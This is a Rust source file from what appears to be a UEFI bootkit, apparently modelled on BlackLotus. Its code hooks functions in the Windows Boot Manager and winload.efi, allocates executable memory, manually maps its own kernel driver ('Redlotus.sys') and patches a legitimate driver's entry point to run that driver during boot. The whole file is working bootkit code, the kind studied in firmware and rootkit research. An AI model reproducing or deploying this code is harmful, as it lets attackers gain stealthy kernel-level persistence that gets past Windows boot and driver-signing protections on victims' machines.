use super::globals::{BL_MEMORY_TYPE_APPLICATION, JMP_SIZE, ORIGINAL_BYTES_COPY};
use super::includes::_LOADER_PARAMETER_BLOCK;
use crate::boot::globals::{
    BlImgAllocateImageBufferSignature_1, BlImgAllocateImageBufferSignature_2,
    ImgArchStartBootApplicationSignature, OslFwpKernelSetupPhase1Signature_1,
    OslFwpKernelSetupPhase1Signature_2, ALLOCATED_BUFFER, BL_MEMORY_ATTRIBUTE_RWX,
    DRIVER_IMAGE_SIZE, NTOSKRNL_HASH, ORIGINAL_BYTES, TARGET_DRIVER_HASH,
};
use crate::boot::pe::{
    get_loaded_module_by_hash, pattern_scan, trampoline_hook64, trampoline_unhook,
};
use crate::mapper::manually_map;
use core::ffi::c_void;
use core::ptr::copy_nonoverlapping;
use core::slice::from_raw_parts;
use uefi::prelude::BootServices;
use uefi::proto::loaded_image::LoadedImage;
use uefi::{Handle, Status};

extern crate alloc;

#[allow(non_camel_case_types)]
type ImgArchStartBootApplicationType = fn(
    app_entry: *mut u8,
    image_base: *mut u8,
    image_size: u32,
    boot_option: u8,
    return_arguments: *mut u8,
) -> uefi::Status;

#[allow(non_upper_case_globals)]
static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;

// Thanks jonaslyk for providing the correct function signature for BlImgAllocateImageBuffer :)
#[allow(non_camel_case_types)]
type BlImgAllocateImageBufferType = fn(
    image_buffer: *mut *mut c_void,
    image_size: u64,
    memory_type: u32,
    preffered_attributes: u32,
    preferred_alignment: u32,
    flags: u32,
) -> uefi::Status;

#[allow(non_upper_case_globals)]
static mut BlImgAllocateImageBuffer: Option<BlImgAllocateImageBufferType> = None;

#[allow(non_camel_case_types)]
type OslFwpKernelSetupPhase1Type = fn(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> uefi::Status;

#[allow(non_upper_case_globals)]
static mut OslFwpKernelSetupPhase1: Option<OslFwpKernelSetupPhase1Type> = None;

pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) -> uefi::Result {
    // Open a handle to the loaded image bootmgfw.efi
    let bootmgr = boot_services.open_protocol_exclusive::<LoadedImage>(*bootmgfw_handle)?;

    // Returns the base address and the size in bytes of the loaded image.
    let (image_base, image_size) = bootmgr.info();

    // Read Windows Boot Manager (bootmgfw.efi) from memory and store in a slice
    let bootmgfw_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the ImgArchStartBootApplication signature in Windows EFI Boot Manager (bootmgfw.efi) and return an offset
    let offset = pattern_scan(bootmgfw_data, ImgArchStartBootApplicationSignature)
        .expect("Failed to pattern scan")
        .expect("Failed to find ImgArchStartBootApplication signature");

    // Print the bootmgfw.efi image base and of ImgArchStartBootApplication offset and image base
    log::info!(
        "[+] bootmgfw.efi {:#p} + ImgArchStartBootApplication offset {:#x} = {:#x}",
        image_base,
        offset,
        (image_base as usize + offset)
    );

    // Save the address of ImgArchStartBootApplication
    unsafe {
        ImgArchStartBootApplication =
            Some(core::mem::transmute::<_, ImgArchStartBootApplicationType>(
                (image_base as usize + offset) as *mut u8,
            ))
    }

    // Trampoline hook ImgArchStartBootApplication and save stolen bytes
    unsafe {
        ORIGINAL_BYTES = trampoline_hook64(
            ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,
            img_arch_start_boot_application_hook as *mut () as *mut u8,
            JMP_SIZE,
        )
        .expect("Failed to hook on ImgArchStartBootApplication");
    }

    Ok(())
}

/// ImgArchStartBootApplication in bootmgfw.efi: hooked to catch the moment when the Windows OS loader (winload.efi)
/// is loaded in the memory but still hasn't been executed to perform more in-memory patching.
/// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
pub fn img_arch_start_boot_application_hook(
    _app_entry: *mut u8,
    image_base: *mut u8,
    image_size: u32,
    _boot_option: u8,
    _return_arguments: *mut u8,
) -> uefi::Status {
    // Unhook ImgArchStartBootApplication and restore stolen bytes before we do anything else
    unsafe {
        trampoline_unhook(
            ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,
            ORIGINAL_BYTES.as_mut_ptr(),
            JMP_SIZE,
        )
    };

    log::info!("[*] ### ImgArchStartBootApplication Hook ###");

    // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
    let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the OslFwpKernelSetupPhase1 signature in Windows OS Loader (winload.efi) and return an offset
    let mut offset = pattern_scan(winload_data, OslFwpKernelSetupPhase1Signature_1)
        .expect("Failed to pattern scan");

    if offset.is_none() {
        offset = pattern_scan(winload_data, OslFwpKernelSetupPhase1Signature_2)
            .expect("Failed to pattern scan");
    }

    let offset = offset.expect("Failed to find OslFwpKernelSetupPhase1 signature");

    // Print the winload.efi image base and OslFwpKernelSetupPhase1 offset and image base
    log::info!(
        "[+] winload.efi {:#p} + OslFwpKernelSetupPhase1 offset {:#x} = {:#x}",
        image_base,
        offset,
        (image_base as usize + offset)
    );

    // Save the address of OslFwpKernelSetupPhase1
    unsafe {
        OslFwpKernelSetupPhase1 = Some(core::mem::transmute::<_, OslFwpKernelSetupPhase1Type>(
            (image_base as usize + offset) as *mut u8,
        ))
    }

    // Trampoline hook OslFwpKernelSetupPhase1 and save stolen bytes
    unsafe {
        ORIGINAL_BYTES = trampoline_hook64(
            OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,
            ols_fwp_kernel_setup_phase1_hook as *mut () as *mut u8,
            JMP_SIZE,
        )
        .expect("Failed to perform trampoline hook on OslFwpKernelSetupPhase1");
    }

    //
    // Hook BlImgAllocateImageBuffer as well for allocating memory for the Windows kernel driver
    //

    // Look for the BlImgAllocateImageBuffer signature in Windows OS Loader (winload.efi) and return an offset
    let mut offset = pattern_scan(winload_data, BlImgAllocateImageBufferSignature_1)
        .expect("Failed to pattern scan");

    if offset.is_none() {
        offset = pattern_scan(winload_data, BlImgAllocateImageBufferSignature_2)
            .expect("Failed to pattern scan");
    }

    let offset = offset.expect("Failed to find BlImgAllocateImageBuffer");

    // Save the address of BlImgAllocateImageBuffer
    unsafe {
        BlImgAllocateImageBuffer = Some(core::mem::transmute::<_, BlImgAllocateImageBufferType>(
            (image_base as usize + offset) as *mut u8,
        ))
    }

    // Trampoline hook BlImgAllocateImageBuffer and save stolen bytes
    unsafe {
        ORIGINAL_BYTES_COPY = trampoline_hook64(
            BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,
            bl_img_allocate_image_buffer_hook as *mut () as *mut u8,
            JMP_SIZE,
        )
        .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
    }

    log::info!("[+] Calling Original ImgArchStartBootApplication");

    // Call the original unhooked ImgArchStartBootApplication function
    return unsafe {
        ImgArchStartBootApplication.unwrap()(
            _app_entry,
            image_base,
            image_size,
            _boot_option,
            _return_arguments,
        )
    };
}

// Thanks jonaslyk for providing the correct function signature for BlImgAllocateImageBuffer :)
/// This is called by the Windows OS loader (winload.efi) to allocate image buffers and we can use it to allocate memory for the Windows kernel driver
fn bl_img_allocate_image_buffer_hook(
    image_buffer: *mut *mut c_void,
    image_size: u64,
    memory_type: u32,
    preffered_attributes: u32,
    preferred_alignment: u32,
    flags: u32,
) -> uefi::Status {
    // Unhook BlImgAllocateImageBuffer and restore stolen bytes before we do anything else
    unsafe {
        trampoline_unhook(
            BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,
            ORIGINAL_BYTES_COPY.as_mut_ptr(),
            JMP_SIZE,
        )
    };

    // Call the original unhooked BlImgAllocateImageBuffer function
    let status = unsafe {
        BlImgAllocateImageBuffer.unwrap()(
            image_buffer,
            image_size,
            memory_type,
            preffered_attributes,
            preferred_alignment,
            flags,
        )
    };

    if status == Status::SUCCESS && memory_type == BL_MEMORY_TYPE_APPLICATION {
        // Allocate memory for the driver
        let status = unsafe {
            BlImgAllocateImageBuffer.unwrap()(
                &mut ALLOCATED_BUFFER as *mut *mut c_void,
                DRIVER_IMAGE_SIZE,
                memory_type,
                BL_MEMORY_ATTRIBUTE_RWX,
                preferred_alignment,
                0,
            )
        };

        log::info!("[+] BlImgAllocateImageBuffer returned: {:?}!", status);
        log::info!("[+] Allocated Buffer: {:#x}", unsafe {
            ALLOCATED_BUFFER as u64
        });

        // This time we don't hook BlImgAllocateImageBuffer again
        return status;
    }

    // Trampoline hook BlImgAllocateImageBuffer and save stolen bytes again
    unsafe {
        ORIGINAL_BYTES_COPY = trampoline_hook64(
            BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,
            bl_img_allocate_image_buffer_hook as *mut () as *mut u8,
            JMP_SIZE,
        )
        .expect("Failed to perform trampoline hook on BlImgAllocateImageBuffer");
    }

    return status;
}

/// This is called by the Windows OS loader (winload.efi) with _LOADER_PARAMETER_BLOCK before calling ExitBootService (winload.efi context)
fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> uefi::Status {
    // Unhook OslFwpKernelSetupPhase1 and restore stolen bytes before we do anything else
    unsafe {
        trampoline_unhook(
            OslFwpKernelSetupPhase1.unwrap() as *mut () as *mut u8,
            ORIGINAL_BYTES.as_mut_ptr(),
            JMP_SIZE,
        )
    };

    log::info!("[*] ### OslFwpKernelSetupPhase1 Hook ###");

    // ntoskrnl.exe hash: 0xa3ad0390
    // Get ntoskrnl.exe _LIST_ENTRY from the _LOADER_PARAMETER_BLOCK to get image base and image size
    let ntoskrnl_module = unsafe {
        get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, NTOSKRNL_HASH)
            .expect("Failed to get ntoskrnl by hash")
    };

    log::info!("[+] ntoskrnl.exe image base: {:p}", unsafe {
        (*ntoskrnl_module).DllBase
    });
    log::info!("[+] ntoskrnl.exe image size: {:#x}", unsafe {
        (*ntoskrnl_module).SizeOfImage
    });

    // The target module is the driver we are going to hook, this will be left to the user to change
    let target_module = unsafe {
        get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead, TARGET_DRIVER_HASH)
            .expect("Failed to get target driver by hash")
    };

    log::info!("[+] Target Driver image base: {:p}", unsafe {
        (*target_module).DllBase
    });
    log::info!("[+] Target Driver image size: {:#x}", unsafe {
        (*target_module).SizeOfImage
    });

    let mapped_driver_address_of_entry_point = unsafe {
        manually_map(
            (*ntoskrnl_module).DllBase as _,
            (*target_module).EntryPoint as _,
        )
        .expect("Failed to manually map Windows kernel driver")
    };

    // lea r8, [rip - 7]
    let asm_bytes: [u8; 7] = [0x4C, 0x8D, 0x05, 0xF9, 0xFF, 0xFF, 0xFF]; // 7 bytes
    unsafe {
        copy_nonoverlapping(
            asm_bytes.as_ptr(),
            (*target_module).EntryPoint as _,
            asm_bytes.len(),
        )
    };

    // Trampoline hook target driver + 7 bytes and redirect to our manually mapped driver
    unsafe {
        ORIGINAL_BYTES = trampoline_hook64(
            ((*target_module).EntryPoint as *mut u8).add(7),
            mapped_driver_address_of_entry_point,
            JMP_SIZE,
        )
        .expect("Failed to perform trampoline hook on target driver")
    };

    log::info!("[+] Hooked Target Driver Entry");
    log::info!(
        "[+] Redlotus.sys DriverEntry: {:#p}",
        mapped_driver_address_of_entry_point
    );
    log::info!("[+] Target Driver DriverEntry: {:p}", unsafe {
        (*target_module).EntryPoint
    });
    log::info!("[+] Target Driver Hook Address: {:#p}", unsafe {
        ((*target_module).EntryPoint as *mut u8).add(7)
    });
    log::info!(
        "[+] Stolen Bytes Address (freed after kernel is loaded): {:#p}",
        unsafe { ORIGINAL_BYTES.as_mut_ptr() }
    );

    log::info!("[+] Loading Windows Kernel...");

    // Call the original unhooked OslFwpKernelSetupPhase1 function
    return unsafe { OslFwpKernelSetupPhase1.unwrap()(loader_block) };
}
